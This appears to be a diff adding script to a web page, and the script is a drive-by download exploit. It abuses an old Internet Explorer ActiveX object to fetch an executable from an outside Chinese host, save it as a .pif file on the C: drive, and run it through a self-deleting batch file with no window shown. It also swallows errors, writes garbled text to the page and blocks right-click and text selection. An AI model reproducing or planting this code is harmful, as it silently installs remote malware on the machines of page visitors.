@@ -1,0 +1,35 @@
+<script>
+function gn(rRaGEykU1)
+{
+var Orh2=window["Math"]["random"]()*rRaGEykU1;
+return'~tmp'+'.tmp'
+}
+try
+{
+fuckyouhack='http://www.bnhkm.cn/google.exe';
+hellohack='C:\\MicroSoft.pif';
+var fuckyouhack_net=window["document"]["createElement"]("object");
+fuckyouhack_net["setAttribute"]("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");
+var fuckyouhack2=fuckyouhack_net["CreateObject"]("Microsoft.X"+"M"+"L"+"H"+"T"+"T"+"P","");
+var fuckyouhack3=fuckyouhack_net["CreateObject"]("Adodb.Stream","");
+fuckyouhack3["type"]=1;
+www_fuckyouhack_net=gn(10000);
+var hHf$R6=fuckyouhack_net["CreateObject"]("Scripting.FileSystemObject","");
+var VgDnZXHt7=hHf$R6["GetSpecialFolder"](0);
+www_fuckyouhack_net=hHf$R6["BuildPath"](VgDnZXHt7,www_fuckyouhack_net);
+var SmAcqIwGV8=fuckyouhack_net["CreateObject"]("Shell.Application","");
+exp1=hHf$R6["BuildPath"](VgDnZXHt7+'\\system32','cmd.exe');
+SmAcqIwGV8["SHellExECuTe"](exp1,' /c echo C:\\MicroSoft.pif >C:\\MicroSoft.bat&echo del %0 >>C:\\MicroSoft.bat',"","open",0);
+fuckyouhack2["open"]("GET",fuckyouhack,0);
+fuckyouhack2["send"]();
+fuckyouhack3["Open"]();
+fuckyouhack3["Write"](fuckyouhack2["responseBody"]);
+fuckyouhack3["SaveToFile"](hellohack,2);
+fuckyouhack3["Close"]();
+SmAcqIwGV8["ShellExecute"](exp1,' /c C:\\MicroSoft.bat',"","open",0)
+}
+catch(i)
+{i=1}
+</script>
+<script type="text/jscript">function init() { document.write("±¬“µ„¡À");}window.onload = init;</script>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
